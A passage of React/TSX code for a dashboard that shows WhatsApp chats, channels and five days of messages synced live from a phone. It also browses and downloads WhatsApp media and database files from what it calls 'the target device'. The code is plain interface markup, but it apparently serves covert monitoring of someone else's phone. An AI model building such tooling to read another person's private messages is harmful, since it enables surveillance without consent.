                            ? "bg-emerald-100 text-emerald-800"
                            : "bg-gray-300/80 text-gray-700"
                        }`}
                      >
                        {personalChats.length}
                      </span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setChatCategory("channels")}
                      className={`flex-1 py-1.5 px-3 rounded-md transition flex items-center justify-center gap-1.5 ${
                        chatCategory === "channels"
                          ? "bg-white text-purple-900 shadow-xs font-bold"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                    >
                      <span>📢 Channels</span>
                      <span
                        className={`text-[10px] px-1.5 py-0.2 rounded-full font-bold ${
                          chatCategory === "channels"
                            ? "bg-purple-100 text-purple-800"
                            : "bg-gray-300/80 text-gray-700"
                        }`}
                      >
                        {channelChats.length}
                      </span>
                    </button>
                  </div>

                  <div className="flex items-center justify-between text-[10px] text-gray-400 px-1 pt-0.5">
                    <span>
                      {displayedChats.length} {displayedChats.length === 1 ? (chatCategory === "chats" ? "chat" : "channel") : (chatCategory === "chats" ? "chats" : "channels")} on device
                    </span>
                    <span className="font-semibold text-emerald-600 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                      Live
                    </span>
                  </div>
                </div>

                {/* Chats & Channels List */}
                <div className="flex-1 min-h-0 overflow-y-auto divide-y divide-gray-100 overscroll-contain">
                  {loading && activeCategoryChats.length === 0 ? (
                    <div className="p-8 text-center text-xs text-gray-400 space-y-1">
                      <span className="animate-spin text-lg block">↻</span>
                      <p>Loading real {chatCategory === "chats" ? "chats" : "channels"} from device...</p>
                    </div>
                  ) : displayedChats.length === 0 ? (
                    <div className="p-8 text-center text-xs text-gray-400 space-y-2">
                      <span className="text-2xl block">{chatCategory === "chats" ? "💬" : "📢"}</span>
                      <p className="font-semibold text-gray-700">
                        {chatCategory === "chats" ? "No chats found on device" : "No WhatsApp channels found"}
                      </p>
                      <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
                        {chatCategory === "chats"
                          ? "No personal WhatsApp chats have been saved from this phone yet. Open WhatsApp on the device or wait for incoming messages to sync."
                          : "WhatsApp channels, community updates, and broadcasts on the device appear here separately from personal chats."}
                      </p>
                      {chatCategory === "chats" && (
                        <button
                          type="button"
                          onClick={() => setActiveView("files")}
                          className="mt-2 text-[11px] font-semibold text-emerald-600 hover:underline inline-flex items-center gap-1"
                        >
                          Browse WhatsApp Storage Files & Backups →
                        </button>
                      )}
                    </div>
                  ) : (
                    displayedChats.map((c) => {
                      const isSelected = selectedChatId === c.id;
                      const isChannelItem = isWhatsAppChannel(c);
                      return (
                        <div
                          key={c.id}
                          onClick={() => setSelectedChatId(c.id)}
                          className={`p-3 cursor-pointer transition flex items-start gap-3 relative ${
                            isSelected
                              ? "bg-emerald-50/60 border-l-4 border-emerald-500 shadow-2xs"
                              : "hover:bg-gray-50/80"
                          }`}
                        >
                          {/* Avatar */}
                          <div
                            className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white relative ${
                              isChannelItem
                                ? "bg-gradient-to-br from-purple-500 to-indigo-600"
                                : "bg-gradient-to-br from-emerald-500 to-teal-600"
                            }`}
                          >
                            {isChannelItem ? "📢" : c.chatName.charAt(0).toUpperCase()}
                            <span
                              className={`absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full border-2 border-white ${
                                isChannelItem ? "bg-indigo-400" : "bg-emerald-400"
                              }`}
                            />
                          </div>

                          {/* Chat / Channel Information */}
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center justify-between gap-1 mb-0.5">
                              <h4 className="text-xs font-bold text-gray-900 truncate">
                                {c.chatName}
                              </h4>
                              <span className="text-[10px] text-gray-400 shrink-0 font-medium">
                                {timeAgo(c.lastMessageAt)}
                              </span>
                            </div>

                            {c.subtitle && (
                              <p className="text-[10px] text-gray-400 font-mono truncate mb-0.5">
                                {c.subtitle}
                              </p>
                            )}

                            {/* Two-line preview without cutting, with full tooltip */}
                            <p
                              className="text-[11px] text-gray-600 line-clamp-2 leading-snug flex items-start gap-1"
                              title={c.lastMessage || ""}
                            >
                              {c.lastIsOutgoing && (
                                <span className="text-emerald-600 font-bold text-[11px] shrink-0">✓✓</span>
                              )}
                              <span>{c.lastMessage || "(No text)"}</span>
                            </p>

                            <div className="mt-1 flex items-center gap-1.5">
                              <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
                                {c.totalMessages} {c.totalMessages === 1 ? "msg" : "msgs"}
                              </span>
                              <span
                                className={`text-[9px] font-semibold uppercase px-1.5 py-0.2 rounded border ${
                                  isChannelItem
                                    ? "bg-purple-50 text-purple-700 border-purple-200"
                                    : "bg-emerald-50 text-emerald-700 border-emerald-200"
                                }`}
                              >
                                {isChannelItem ? "Channel" : "WhatsApp"}
                              </span>
                            </div>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              </div>

              {/* ----------------------------------------------------------- */}
              {/* COLUMN 3: SELECTED CHAT CONVERSATION (LAST 5 DAYS DATA)      */}
              {/* ----------------------------------------------------------- */}
              <div className="md:col-span-5 lg:col-span-6 flex flex-col bg-slate-100/60 h-full min-h-0 overflow-hidden">
                {selectedChatSummary ? (
                  <>
                    {/* Conversation Header */}
                    <div className="p-3 border-b border-gray-200 bg-white flex items-center justify-between gap-3 shadow-2xs shrink-0">
                      <div className="flex items-center gap-3 min-w-0">
                        <div
                          className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white ${
                            isWhatsAppChannel(selectedChatSummary) ? "bg-purple-600" : "bg-emerald-600"
                          }`}
                        >
                          {isWhatsAppChannel(selectedChatSummary) ? "📢" : selectedChatSummary.chatName.charAt(0).toUpperCase()}
                        </div>
                        <div className="min-w-0">
                          <h3 className="text-xs font-bold text-gray-900 truncate">
                            {selectedChatSummary.chatName}
                          </h3>
                          <p className="text-[10px] text-gray-400 flex items-center gap-1">
                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block" />
                            <span className="truncate">
                              {selectedChatSummary.subtitle || "WhatsApp Contact"} • Conversation Activity
                            </span>
                          </p>
                        </div>
                      </div>

                      <div className="flex items-center gap-2 shrink-0">
                        <div className="bg-gray-100 p-0.5 rounded-md flex text-[10px] font-medium">
                          <button
                            type="button"
                            onClick={() => setTimeFilter("5days")}
                            className={`px-2 py-0.5 rounded transition ${
                              timeFilter === "5days"
                                ? "bg-white text-gray-900 shadow-2xs font-semibold"
                                : "text-gray-500 hover:text-gray-900"
                            }`}
                          >
                            Last 5 Days
                          </button>
                          <button
                            type="button"
                            onClick={() => setTimeFilter("all")}
                            className={`px-2 py-0.5 rounded transition ${
                              timeFilter === "all"
                                ? "bg-white text-gray-900 shadow-2xs font-semibold"
                                : "text-gray-500 hover:text-gray-900"
                            }`}
                          >
                            All ({selectedChatSummary.totalMessages})
                          </button>
                        </div>
                        <span className="text-[10px] font-semibold px-2.5 py-0.5 rounded-full border bg-emerald-50 text-emerald-700 border-emerald-200">
                          {activeThreadMessages.length} msgs
                        </span>
                      </div>
                    </div>

                    {/* 5-Day Real Activity & User Login Time Banner */}
                    <div className="px-3.5 py-2 bg-gradient-to-r from-emerald-50 via-teal-50/70 to-emerald-50 border-b border-emerald-100 flex flex-wrap items-center justify-between gap-2 text-xs text-emerald-950 shrink-0 shadow-2xs">
                      <div className="flex items-center gap-2 min-w-0">
                        <span className="text-sm">📅</span>
                        <div className="flex flex-col sm:flex-row sm:items-center sm:gap-2 min-w-0">
                          <span className="font-bold text-emerald-900 text-[11px]">
                            Last 5 Days Chat Contents
                          </span>
                          <span className="hidden sm:inline text-emerald-300">•</span>
                          <span className="text-[11px] text-emerald-800 truncate">
                            Dashboard Login:{" "}
                            <strong className="font-semibold text-emerald-950">
                              {formatMessageDateTime(dashboardLoginTime.toISOString())}
                            </strong>
                          </span>
                        </div>
                      </div>
                      <div className="flex items-center gap-1.5 shrink-0">
                        <span className="text-[10px] font-semibold text-emerald-800 bg-white px-2 py-0.5 rounded-full border border-emerald-200 flex items-center gap-1 shadow-2xs">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                          Live Real-Time
                        </span>
                      </div>
                    </div>

                    {/* Messages Scroll Canvas */}
                    <div className="flex-1 min-h-0 p-4 overflow-y-auto space-y-4 bg-[#efeae2]/40 bg-[radial-gradient(#d1d5db_1px,transparent_1px)] [background-size:16px_16px]">
                      {messagesLoading ? (
                        <div className="text-center py-12 text-xs text-gray-400">
                          Loading messages...
                        </div>
                      ) : activeThreadMessages.length === 0 ? (
                        <div className="text-center py-14 text-xs text-gray-400 space-y-2">
                          <span className="text-3xl block">💬</span>
                          <p className="font-semibold text-gray-700">
                            {selectedChatSummary.totalMessages > 0 && timeFilter === "5days"
                              ? "No messages exchanged in the last 5 days"
                              : "No messages recorded yet for this contact"}
                          </p>
                          <p className="text-[11px] text-gray-400 max-w-sm mx-auto">
                            {selectedChatSummary.totalMessages > 0
                              ? "Older messages exist outside the 5-day window."
                              : "Incoming notifications and conversation messages will sync here automatically when received on the device."}
                          </p>
                          {selectedChatSummary.totalMessages > 0 && timeFilter === "5days" && (
                            <button
                              type="button"
                              onClick={() => setTimeFilter("all")}
                              className="text-emerald-700 font-semibold underline text-[11px]"
                            >
                              Show all stored messages →
                            </button>
                          )}
                        </div>
                      ) : (
                        groupedMessages.map((group) => (
                          <div key={group.dateLabel} className="space-y-3">
                            {/* Date Badge */}
                            <div className="flex items-center justify-center my-2">
                              <span className="text-[10px] font-semibold px-3 py-1 rounded-full bg-white/90 text-gray-600 shadow-2xs border border-gray-200/70 uppercase tracking-wide">
                                {group.dateLabel}
                              </span>
                            </div>

                            {/* Chat Speech Bubbles - SENDER vs RECEIVER SIDE */}
                            {group.items.map((m) => {
                              const isMe = m.isOutgoing || m.sender?.toLowerCase() === "me" || m.sender?.toLowerCase() === "you";
                              return (
                                <div
                                  key={m.id}
                                  className={`flex w-full my-2.5 ${isMe ? "justify-end" : "justify-start"}`}
                                >
                                  <div
                                    className={`max-w-[85%] sm:max-w-[78%] md:max-w-[72%] rounded-2xl px-4 py-2.5 shadow-xs space-y-1 text-xs relative ${
                                      isMe
                                        ? "bg-[#d9fdd3] text-gray-900 rounded-br-xs border border-emerald-300/60"
                                        : "bg-white text-gray-900 rounded-bl-xs border border-gray-200"
                                    }`}
                                  >
                                    {/* Sender vs Receiver Header Label */}
                                    <div
                                      className={`flex items-center justify-between gap-3 pb-1 border-b text-[10px] ${
                                        isMe
                                          ? "border-emerald-600/10 text-emerald-800"
                                          : "border-gray-100 text-gray-700"
                                      }`}
                                    >
                                      <span className="font-bold flex items-center gap-1 truncate">
                                        <span>{isMe ? "↗" : "↙"}</span>
                                        <span>
                                          {isMe ? "You (Sender)" : `${m.sender || selectedChatSummary.chatName} (Receiver)`}
                                        </span>
                                      </span>
                                      <span
                                        className={`text-[9px] font-semibold px-1.5 py-0.2 rounded shrink-0 ${
                                          isMe
                                            ? "bg-emerald-100/80 text-emerald-800"
                                            : "bg-gray-100 text-gray-600"
                                        }`}
                                      >
                                        {isMe ? "Sender" : "Receiver"}
                                      </span>
                                    </div>

                                    {/* Media: Audio Voice Note */}
                                    {m.mediaType === "audio" && (
                                      <div className="py-1 flex items-center justify-between gap-3 border-b border-black/5 pb-1 mb-1">
                                        <span className="font-semibold text-xs flex items-center gap-1">
                                          <span>🎙️</span>
                                          <span>Voice Note (.opus)</span>
                                        </span>
                                        {m.mediaPath && (
                                          <button
                                            type="button"
                                            onClick={() => handleDownloadMedia(m.mediaPath!, "voice_note.opus")}
                                            className="text-[10px] text-emerald-700 hover:underline font-semibold"
                                          >
                                            Download ⬇
                                          </button>
                                        )}
                                      </div>
                                    )}

                                    {/* Media: Image Photo */}
                                    {m.mediaType === "image" && (
                                      <div className="py-1 space-y-1">
                                        {m.mediaPath && m.mediaPath.startsWith("http") ? (
                                          <img
                                            src={m.mediaPath}
                                            alt="Chat attachment"
                                            className="w-full max-h-48 object-cover rounded-lg"
                                          />
                                        ) : (
                                          <div className="flex items-center justify-between gap-3 border-b border-black/5 pb-1">
                                            <span className="font-semibold text-xs flex items-center gap-1">
                                              <span>📷</span>
                                              <span>Photo Attachment</span>
                                            </span>
                                            {m.mediaPath && (
                                              <button
                                                type="button"
                                                onClick={() => handleDownloadMedia(m.mediaPath!, "photo.jpg")}
                                                className="text-[10px] text-emerald-700 hover:underline font-semibold"
                                              >
                                                Download ⬇
                                              </button>
                                            )}
                                          </div>
                                        )}
                                      </div>
                                    )}

                                    {/* Message Text Content - Showing FULL content without truncation */}
                                    <p className="whitespace-pre-wrap break-words leading-relaxed text-[13px] text-gray-900 select-text font-normal">
                                      {m.text}
                                    </p>

                                    {/* Message Footer: Timestamp & Read Receipt */}
                                    <div
                                      className={`flex items-center justify-end gap-1.5 text-[10px] pt-1 font-medium ${
                                        isMe ? "text-emerald-800/80" : "text-gray-400"
                                      }`}
                                    >
                                      <span>{formatMessageTime(m.timestamp)}</span>
                                      {isMe && (
                                        <span className="text-[#34b7f1] font-bold text-[11px] tracking-tighter" title="Delivered & Read">
                                          ✓✓
                                        </span>
                                      )}
                                    </div>
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        ))
                      )}
                    </div>
                  </>
                ) : (
                  <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
                    <span className="text-4xl block">💬</span>
                    <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
                    <p className="text-xs text-gray-400 max-w-sm">
                      Select a chat on the left panel to display the conversation thread and messages from the last 5 days.
                    </p>
                  </div>
                )}
              </div>
            </>
          )}

        {/* =================================================================== */}
        {/* WHATSAPP RAW STORAGE FILE MANAGER                                   */}
        {/* =================================================================== */}
        {selectedApp === "whatsapp" && activeView === "files" && (
          <div className="md:col-span-9 lg:col-span-9.5 p-5 space-y-4 bg-white overflow-y-auto h-full min-h-0">
            <div className="flex flex-wrap items-center justify-between gap-3 bg-gray-50 p-3 rounded-lg border border-gray-100">
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={handleScanWhatsAppFiles}
                  disabled={filesLoading}
                  className="flex items-center gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold px-3 py-1.5 rounded-lg shadow-xs hover:shadow transition disabled:opacity-50"
                >
                  <span>{filesLoading ? "⌛" : "🔍"}</span>
                  <span>{filesLoading ? "Scanning Phone..." : "Scan WhatsApp Storage"}</span>
                </button>

                {fileStatus && (
                  <span className="text-xs text-gray-500 italic max-w-md truncate">
                    {fileStatus}
                  </span>
                )}
              </div>

              <div className="flex flex-wrap gap-1 text-[11px]">
                <button
                  type="button"
                  onClick={() => setCategoryFilter("all")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "all" ? "bg-gray-800 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  All Folders
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("images")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "images" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  📷 Images
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("voice")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "voice" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  🎙️ Voice Notes & Audio
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("docs")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "docs" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  📄 Documents
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter("db")}
                  className={`px-2.5 py-1 rounded-md transition font-medium ${
                    categoryFilter === "db" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  💾 Databases & Crypt
                </button>
              </div>
            </div>

            {files && categoryFilter === "all" && (
              <div className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-50 rounded-lg text-xs font-mono overflow-x-auto text-gray-600">
                <button
                  type="button"
                  onClick={() => setCurrentPath("")}
                  className="hover:underline font-semibold text-emerald-700"
                >
                  WhatsApp
                </button>
                {breadcrumbs.map((seg, i) => {
                  const segPath = breadcrumbs.slice(0, i + 1).join("/");
                  const isLast = i === breadcrumbs.length - 1;
                  return (
                    <span key={segPath} className="flex items-center gap-1.5">
                      <span className="text-gray-300">/</span>
                      <button
                        type="button"
                        onClick={() => setCurrentPath(segPath)}
                        className={`hover:underline ${isLast ? "font-bold text-gray-900" : "text-emerald-700"}`}
                      >
                        {seg}
                      </button>
                    </span>
                  );
                })}
              </div>
            )}

            {files ? (
              <div className="border border-gray-200 rounded-lg overflow-hidden">
                <div className="max-h-96 overflow-y-auto">
                  {directoryChildren.length === 0 ? (
                    <div className="p-8 text-center text-xs text-gray-400">
                      No files found in this folder or category.
                    </div>
                  ) : (
                    <table className="w-full text-xs text-left">
                      <thead className="bg-gray-50 text-gray-500 font-semibold border-b sticky top-0">
                        <tr>
                          <th className="px-3.5 py-2">Name</th>
                          <th className="px-3 py-2">Path / Type</th>
                          <th className="px-3 py-2 text-right">Size</th>
                          <th className="px-3.5 py-2 text-right pr-4">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-gray-100">
                        {directoryChildren.map((f) => {
                          const isDownloading = downloadingFile === f.path;
                          return (
                            <tr key={f.path} className="hover:bg-emerald-50/40 transition group">
                              <td
                                className="px-3.5 py-2.5 font-medium cursor-pointer"
                                onClick={() => {
                                  if (f.isDirectory) setCurrentPath(f.path);
                                }}
                              >
                                <div className="flex items-center gap-2">
                                  <span className="text-base">
                                    {f.isDirectory
                                      ? "📁"
                                      : f.name.endsWith(".opus") || f.name.endsWith(".mp3")
                                      ? "🎙️"
                                      : /\.(jpg|jpeg|png|webp)$/i.test(f.name)
                                      ? "🖼️"
                                      : f.name.includes("crypt") || f.name.endsWith(".db")
                                      ? "💾"
                                      : "📄"}
                                  </span>
                                  <span className="text-gray-900 group-hover:text-emerald-700 transition">
                                    {f.name}
                                  </span>
                                </div>
                              </td>
                              <td className="px-3 py-2 text-gray-500 text-[11px] font-mono truncate max-w-xs">
                                {f.isDirectory ? "Folder" : f.path}
                              </td>
                              <td className="px-3 py-2 text-right text-gray-500 font-mono whitespace-nowrap">
                                {f.sizeBytes != null ? formatSize(f.sizeBytes) : "—"}
                              </td>
                              <td className="px-3.5 py-2 text-right pr-4 whitespace-nowrap">
                                {f.isDirectory ? (
                                  <button
                                    type="button"
                                    onClick={() => setCurrentPath(f.path)}
                                    className="text-[11px] text-emerald-600 hover:underline font-semibold"
                                  >
                                    Open →
                                  </button>
                                ) : (
                                  <button
                                    type="button"
                                    onClick={() => handleDownloadMedia(f.path, f.name)}
                                    disabled={isDownloading}
                                    className="inline-flex items-center gap-1 text-[11px] px-2.5 py-1 bg-white hover:bg-emerald-50 text-emerald-700 border border-emerald-300 rounded font-medium shadow-2xs transition disabled:opacity-50"
                                  >
                                    <span>{isDownloading ? "⌛" : "⬇"}</span>
                                    <span>{isDownloading ? "Downloading..." : "Download"}</span>
                                  </button>
                                )}
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  )}
                </div>
              </div>
            ) : (
              <div className="border border-dashed border-gray-200 rounded-xl p-10 text-center space-y-3">
                <span className="text-4xl block">📁</span>
                <h4 className="text-sm font-bold text-gray-800">
                  Inspect WhatsApp Media Files & Databases
                </h4>
                <p className="text-xs text-gray-500 max-w-md mx-auto leading-relaxed">
                  Click "Scan WhatsApp Storage" above to inspect WhatsApp's actual folder tree (Images, Voice Notes, Documents, and Databases) on the target device.
                </p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
